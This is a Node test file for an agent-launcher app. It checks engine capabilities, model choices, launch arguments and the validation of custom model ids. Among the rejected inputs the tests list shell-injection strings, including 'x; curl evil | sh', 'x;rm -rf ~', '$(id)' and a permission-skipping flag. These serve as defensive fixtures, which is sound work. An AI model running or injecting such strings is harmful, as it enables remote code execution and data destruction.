// Engine capabilities (contract v3.36): node --test app/test/engine-caps.test.mjs
import test from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { createRequire } from 'node:module'
import { ENGINES, FEATURES, caps, cap, BOSS_MODEL_CHOICES, bossModelChoices, CUSTOM_MODEL_RE, isCustomModelId } from '../src/engine-caps.mjs'

const require = createRequire(import.meta.url)
const P = require('../src/projects.js')
const EN = require('../src/engine.js')
const A = require('../src/accounts.js')
const H = require('../src/handoff.js')
const en = JSON.parse(readFileSync(new URL('../locales/en.json', import.meta.url), 'utf8'))

test('every engine has every feature; Claude Code can do all of them', () => {
  for (const e of ENGINES) assert.deepEqual(Object.keys(caps(e)), FEATURES)
  for (const f of FEATURES) assert.equal(cap('claude', f).ok, f !== 'projectFiles', f) // nothing is written for Claude Code (v3.38)
  assert.deepEqual(caps('nope'), caps('claude')) // unknown engine = Claude Code
  assert.deepEqual(caps(undefined), caps('claude'))
})

test('a feature an engine cannot honour has a reason with a locale string', () => {
  for (const e of ENGINES) for (const projectFiles of [false, true]) {
    for (const [f, c] of Object.entries(caps(e, { projectFiles }))) {
      if (c.ok) { assert.equal(c.reason, undefined); continue }
      assert.equal(typeof en.sidebar.na[c.reason], 'string', `${e}.${f}: sidebar.na.${c.reason} missing`)
    }
  }
})

test('account, login and boss model work on every engine; backup on none but Claude Code', () => {
  for (const e of ENGINES) for (const f of ['account', 'login', 'bossModel', 'approvals']) assert.equal(cap(e, f).ok, true, `${e}.${f}`)
  assert.equal(cap('agy', 'backup').ok, false)
  assert.equal(cap('commandcode', 'backup').ok, false)
})

test('Command Code: manager, context cap, savings, workers, approvals and cost on; Antigravity: off', () => {
  for (const f of ['manager', 'contextCap', 'savings', 'workers', 'approvals', 'cost']) assert.equal(cap('commandcode', f).ok, true, f)
  for (const f of ['manager', 'agentModel', 'contextCap', 'savings', 'workers', 'cost']) assert.equal(cap('agy', f).ok, false, f)
  assert.equal(cap('commandcode', 'agentModel').ok, false)
})

test('boss model choices match projects.js per engine; launch arguments per engine', () => {
  for (const e of ENGINES) assert.deepEqual(bossModelChoices(e).map((c) => c.value), P.BOSS_MODELS_BY_ENGINE[e], e)
  assert.deepEqual(BOSS_MODEL_CHOICES.claude.map((c) => c.value), P.BOSS_MODELS)
  // v3.68: explicit Claude 5.5 ids next to the aliases, accepted and passed as `--model <id>`
  for (const id of ['claude-opus-5-5', 'claude-sonnet-5-5', 'claude-haiku-5-5']) {
    assert.ok(BOSS_MODEL_CHOICES.claude.some((c) => c.value === id), id)
    assert.ok(P.BOSS_MODELS_BY_ENGINE.claude.includes(id), id)
    assert.deepEqual(P.bossModelArgs({ bossModel: id }), ['--model', id])
    assert.equal(P.bossModelOf({ engine: 'claude', bossModel: id }), id)
    assert.equal(P.agentModelOf({ agentModel: id }), id)
  }
  assert.deepEqual(P.bossModelArgs({ bossModel: 'opus' }), ['--model', 'opus']) // aliases stay
  assert.deepEqual(BOSS_MODEL_CHOICES.claude.map((c) => c.label).slice(3), ['Fable', 'Fable 5.2', 'Opus 5.5', 'Sonnet 5.5', 'Haiku 5.5'])
  assert.deepEqual(P.setProjectBossModel({ projects: [{ id: 'a', engine: 'claude' }] }, 'a', 'claude-opus-5-5').projects[0].bossModel, 'claude-opus-5-5')
  assert.deepEqual(P.bossModelArgs({ engine: 'agy', bossModel: 'pro' }), ['--model', 'pro'])
  assert.deepEqual(P.bossModelArgs({ engine: 'agy', bossModel: 'opus' }), []) // not an agy model: Auto
  assert.deepEqual(P.bossModelArgs({ engine: 'commandcode', bossModel: 'claude-opus-5-5' }), ['-m', 'claude-opus-5-5'])
  assert.deepEqual(P.bossModelArgs({ engine: 'commandcode', bossModel: 'haiku' }), [])
  assert.deepEqual(P.bossModelArgs({ bossModel: 'flash' }), []) // not a Claude alias
  // the model goes first, before --continue and the prompt
  assert.deepEqual(EN.agyArgs({ model: 'flash', resume: true, prompt: 'go' }), ['--model', 'flash', '--continue', '-i', 'go'])
  assert.deepEqual(EN.cmdArgs({ model: 'claude-haiku-5-5', resume: true, prompt: 'go' }), ['-m', 'claude-haiku-5-5', '--continue', 'go'])
  assert.deepEqual(EN.agyArgs({ model: null }), [])
  assert.deepEqual(EN.cmdArgs({}), [])
})

test('delegate (v3.56): Claude Code only; agy, Command Code and OpenCode off with a reason', () => {
  assert.ok(FEATURES.includes('delegate'))
  assert.equal(cap('claude', 'delegate').ok, true)
  for (const e of ['agy', 'commandcode', 'opencode']) {
    assert.equal(cap(e, 'delegate').ok, false, e)
    assert.equal(cap(e, 'delegate').reason, 'claudeOnlyDelegate', e)
  }
})

test('setProjectBossModel validates against the project engine; normalizeState drops a misfit', () => {
  const s = { projects: [{ id: 'a', dir: '/a', engine: 'agy' }, { id: 'c', dir: '/c', engine: 'commandcode' }, { id: 'k', dir: '/k' }] }
  assert.equal(P.setProjectBossModel(s, 'a', 'opus'), s)
  assert.equal(P.findProject(P.setProjectBossModel(s, 'a', 'pro'), 'a').bossModel, 'pro')
  assert.equal(P.findProject(P.setProjectBossModel(s, 'c', 'deepseek/deepseek-v4-flash'), 'c').bossModel, 'deepseek/deepseek-v4-flash')
  assert.equal(P.setProjectBossModel(s, 'k', 'claude-opus-5-5').projects[2].bossModel, 'claude-opus-5-5') // v3.68: a Claude 5.5 id fits the default (claude) engine
  assert.equal(P.setProjectBossModel(s, 'k', 'deepseek/deepseek-v4-flash'), s)
  const n = P.normalizeState({ projects: [{ dir: '/x', engine: 'agy', bossModel: 'opus' }, { dir: '/y', engine: 'agy', bossModel: 'flash' }] })
  assert.deepEqual(n.projects.map((p) => p.bossModel ?? null), ['opus', 'flash']) // kept for another engine; bossModelOf says Auto for agy
  assert.deepEqual(n.projects.map((p) => P.bossModelOf(p)), [null, 'flash'])
})

test('no leak: the model is the only thing added to the agy / Command Code launch line', () => {
  const a = EN.agyArgs({ model: 'pro' }); const c = EN.cmdArgs({ model: 'claude-opus-5-5' })
  assert.deepEqual([a, c], [['--model', 'pro'], ['-m', 'claude-opus-5-5']])
  for (const x of [...a, ...c]) assert.doesNotMatch(x, /plugin|settings|mcp|office|AGENT_OFFICE/i)
})

test('project files toggle (v3.38): agy manager + agent model and Command Code agent model need it; off says why', () => {
  for (const [e, fs] of [['agy', ['manager', 'agentModel']], ['commandcode', ['agentModel']]]) {
    for (const f of fs) {
      assert.deepEqual(cap(e, f), { ok: false, reason: 'filesOff' }, `${e}.${f}`)
      assert.deepEqual(cap(e, f, { projectFiles: true }), { ok: true }, `${e}.${f}`)
    }
    assert.equal(cap(e, 'projectFiles').ok, true)
  }
  assert.match(en.sidebar.na.filesOff, /turn on Agent Office files/)
  assert.equal(cap('claude', 'projectFiles').reason, 'claudeProjectFiles')
  assert.deepEqual(caps('claude', { projectFiles: true }), caps('claude')) // the toggle changes nothing for Claude Code
  for (const f of ['contextCap', 'savings', 'workers', 'cost', 'backup']) assert.equal(cap('agy', f, { projectFiles: true }).ok, false, f)
})

test('OpenCode (contract v3.40): observed only; boss model via -m, no files, no login needed', () => {
  assert.ok(ENGINES.includes('opencode'))
  const tr = JSON.parse(readFileSync(new URL('../locales/tr.json', import.meta.url), 'utf8'))
  for (const f of ['account', 'login', 'bossModel', 'approvals']) assert.equal(cap('opencode', f).ok, true, f)
  for (const projectFiles of [false, true]) {
    for (const f of ['manager', 'agentModel', 'contextCap', 'savings', 'backup', 'workers', 'cost', 'projectFiles']) {
      const c = cap('opencode', f, { projectFiles })
      assert.equal(c.ok, false, f); assert.match(c.reason, /^oc/)
      assert.equal(typeof en.sidebar.na[c.reason], 'string'); assert.equal(typeof tr.sidebar.na[c.reason], 'string')
    }
  }
  assert.notDeepEqual(caps('opencode'), caps('claude'))
  assert.deepEqual(bossModelChoices('opencode').map((c) => c.value), P.BOSS_MODELS_BY_ENGINE.opencode)
  assert.ok(bossModelChoices('opencode').every((c) => c.value.includes('/'))) // provider/model
})

test('OpenCode in the sidebar (contract v3.36, v3.40): an Account entry, a read-only tag, no badge for "not logged in"', () => {
  const sb = readFileSync(new URL('../renderer/sidebar.js', import.meta.url), 'utf8')
  assert.match(sb, /opencode: '__engine:opencode'/)
  assert.match(sb, /const engineOfRow = \(p\) => \([^\n]*p\.engine === 'opencode'/)
  assert.match(sb, /if \(ocShown\(\) \|\| engine === 'opencode'\) \{[^\n]*\n\s*sel\.append\(engineOpt\(ENGINE_OPT\.opencode/)
  assert.equal(sb.includes('function engineSelect'), false) // the Engine select is gone since v3.36
  const badge = sb.slice(sb.indexOf('function loginBadge'), sb.indexOf('function renderProjects'))
  assert.match(badge, /engine === 'opencode'\) \{[^\n]*\n\s*if \(ocAuth\?\.state !== 'missing'\) return null;/)
  const tag = sb.slice(sb.indexOf('function engineTag'), sb.indexOf('function backupSelect'))
  assert.match(tag, /engine === 'opencode'\) return h\('span', \{ class: 'sb-tag sb-agy', title: t\('sidebar\.ocHintTitle'\) \}/)
  const mock = readFileSync(new URL('../renderer/dev-mock.js', import.meta.url), 'utf8')
  assert.match(mock, /q\.has\('ocProject'\) && projects\[2\]\) \/\*\* @type \{any\} \*\/ \(projects\[2\]\)\.engine = 'opencode'/)
  for (const k of ['ocHint', 'ocHintTitle', 'engineOpencode', 'ocMissing', 'ocMissingTitle']) assert.equal(typeof en.sidebar[k], 'string', k)
})

test('Fable 5.2: listed for the Claude Code boss and agent, first among the full ids, on no other engine (v3.73)', () => {
  const values = BOSS_MODEL_CHOICES.claude.map((c) => c.value)
  assert.deepEqual(values.filter((v) => v.startsWith('claude-'))[0], 'claude-fable-5-2')
  assert.equal(BOSS_MODEL_CHOICES.claude.find((c) => c.value === 'claude-fable-5-2').label, 'Fable 5.2')
  for (const id of ['fable', 'claude-fable-5-2']) {
    assert.ok(P.BOSS_MODELS.includes(id) && P.AGENT_MODELS.includes(id), id)
    assert.deepEqual(P.bossModelArgs({ bossModel: id }), ['--model', id])
    assert.equal(P.agentModelOf({ agentModel: id }), id)
    assert.equal(A.sessionEnv({}, { agentModel: P.agentModelOf({ agentModel: id }) }).CLAUDE_CODE_SUBAGENT_MODEL, id)
    for (const e of ENGINES.filter((x) => x !== 'claude')) {
      assert.equal(bossModelChoices(e).some((c) => /fable/i.test(c.value)), false, e)
      assert.equal(P.BOSS_MODELS_BY_ENGINE[e].some((v) => /fable/i.test(v)), false, e)
      assert.deepEqual(P.bossModelArgs({ engine: e, bossModel: id }), [], e)
    }
  }
  // the agent list is the boss list in the agent picker's alias order (the sidebar builds its options from both)
  assert.deepEqual([...P.AGENT_MODELS].sort(), [...P.BOSS_MODELS].sort())
})

test('custom model id: one validator, the same pattern in the renderer (v3.73)', () => {
  assert.equal(CUSTOM_MODEL_RE.source, P.CUSTOM_MODEL_RE.source)
  const good = ['claude-fable-5-2', 'claude-opus-5-5', 'sonnet[1m]', 'us.anthropic.claude-fable-5-2-v1:0', 'vendor/model_x', 'a', 'a'.repeat(100), 'fixcloudx/m']
  const bad = ['', ' ', 'a'.repeat(101), 'claude fable', 'a;b', 'a$(id)', '$(id)', 'a`id`', "a'b", 'a"b', 'a\nb', 'a\n', '-model', '--dangerously-skip-permissions',
    'a|b', 'a&b', 'a>b', 'a<b', 'a\\b', 'a*b', 'a?b', 'a~b', 'a{b}', 'a(b)', 'a!b', 'a#b', 'a%b', 'a=b', 'a,b', 'a\tb', 'a\0b', 'fixcloud/glm-4.6', 'FIXCLOUD/x', '.a', '[a]', '/a', 'é', null, undefined, 5, {}, ['a']]
  for (const v of good) { assert.equal(P.customModelValue(v), v, v); assert.equal(isCustomModelId(v), true, v) }
  for (const v of bad) { assert.equal(P.customModelValue(v), null, String(v)); assert.equal(isCustomModelId(v), false, String(v)) }
})

test('custom model id: set, load, launch argument and agent env; Claude Code only (v3.73)', () => {
  let s = P.normalizeState({ projects: [{ id: 'a', dir: '/a' }, { id: 'g', dir: '/g', engine: 'agy' }] })
  s = P.setProjectAgentModel(P.setProjectBossModel(s, 'a', 'claude-next-9'), 'a', 'sonnet[1m]')
  s = P.normalizeState(JSON.parse(JSON.stringify(s))) // saved and loaded again
  const a = P.findProject(s, 'a')
  assert.deepEqual([a.bossModel, a.agentModel], ['claude-next-9', 'sonnet[1m]'])
  assert.deepEqual(P.bossModelArgs(a), ['--model', 'claude-next-9'])
  const env = A.sessionEnv({}, { agentModel: P.agentModelOf(a) })
  assert.deepEqual([env.AGENT_OFFICE_AGENT_MODEL, env.CLAUDE_CODE_SUBAGENT_MODEL, env.CLAUDE_CODE_SUBAGENT_MODEL_FORCE], ['sonnet[1m]', 'sonnet[1m]', '1'])
  // refused: the setter returns the same state, the loader drops it to Auto
  for (const v of ['fixcloud/glm-4.6', 'FixCloud/x', 'a b', 'x;rm -rf ~', '$(id)', '`id`', '-p', 'a\nb', 'a'.repeat(101)]) {
    assert.equal(P.setProjectBossModel(s, 'a', v), s, v)
    assert.equal(P.setProjectAgentModel(s, 'a', v), s, v)
    const l = P.normalizeState({ projects: [{ id: 'x', dir: '/x', bossModel: v, agentModel: v }] }).projects[0]
    assert.equal('bossModel' in l || 'agentModel' in l, false, v)
    assert.deepEqual([P.bossModelArgs({ bossModel: v }), P.agentModelOf({ agentModel: v })], [[], null], v)
  }
  // other engines: no custom id is set or used, whatever is stored
  assert.equal(P.setProjectBossModel(s, 'g', 'claude-next-9'), s)
  assert.equal(P.setProjectAgentModel(s, 'g', 'claude-next-9'), s)
  for (const e of ENGINES.filter((x) => x !== 'claude')) {
    assert.deepEqual(P.bossModelArgs({ engine: e, bossModel: 'claude-next-9' }), [], e)
    assert.equal(P.agentModelOf({ engine: e, agentModel: 'constructor' }), null, e)
    assert.equal(P.agentModelOf({ engine: e, agentModel: 'opus' }), 'opus', e) // listed values as before
  }
  // an engine switch keeps the stored id and reads it as Auto; switching back finds it again
  const sw = P.setProjectEngine(s, 'a', 'agy')
  assert.deepEqual([P.bossModelOf(P.findProject(sw, 'a')), P.agentModelOf(P.findProject(sw, 'a'))], [null, null])
  assert.equal(P.bossModelOf(P.findProject(P.setProjectEngine(sw, 'a', 'claude'), 'a')), 'claude-next-9')
  // another engine's own model left behind is not a Claude custom id
  for (const v of ['flash', 'pro', 'deepseek/deepseek-v4-flash', 'opencode/big-pickle']) assert.deepEqual(P.bossModelArgs({ bossModel: v }), [], v)
})

test('custom model id from a handoff: the receiving loader keeps a valid one and drops an invalid one (v3.73)', () => {
  const adopt = (settings) => { // main.js link adopt: the transferred settings are spread onto the project, then normalizeState
    const clean = H.cleanSettings(settings)
    return P.normalizeState({ projects: [{ id: 'a', dir: '/a', ...clean }] }).projects[0]
  }
  assert.deepEqual([adopt({ bossModel: 'claude-next-9', agentModel: 'claude-next-9' })].map((p) => [p.bossModel, p.agentModel]), [['claude-next-9', 'claude-next-9']])
  for (const v of ['x; curl evil | sh', '$(id)', '--settings=/tmp/x', 'a b', { a: 1 }, ['opus'], 7]) {
    const p = adopt({ bossModel: v, agentModel: v, manager: true })
    assert.equal('bossModel' in p || 'agentModel' in p, false, JSON.stringify(v))
    assert.equal(p.manager, true)
  }
})
